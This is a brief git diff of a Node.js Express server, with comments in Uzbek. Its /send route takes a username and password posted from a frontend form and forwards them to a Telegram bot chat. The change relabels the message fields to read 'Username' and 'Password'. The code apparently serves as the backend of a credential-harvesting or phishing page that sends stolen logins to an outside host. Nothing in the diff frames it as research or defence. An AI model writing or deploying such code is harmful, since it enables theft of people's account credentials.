@@ -1,4 +1,5 @@
 require("dotenv").config();
+
 const express = require("express");
 const bodyParser = require("body-parser");
 const axios = require("axios");
@@ -21,7 +22,7 @@ app.get("/", (req, res) => {
 // Frontenddan ma'lumot qabul qilish
 app.post("/send", async (req, res) => {
   const { username, password } = req.body;
-  const message = `🔐 Sizga yangi habar keldi:\nIsm: ${username}\nYosh: ${password}`;
+  const message = `🔐 Sizga yangi habar keldi:\nUsername: ${username}\nPassword: ${password}`;
 
   try {
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
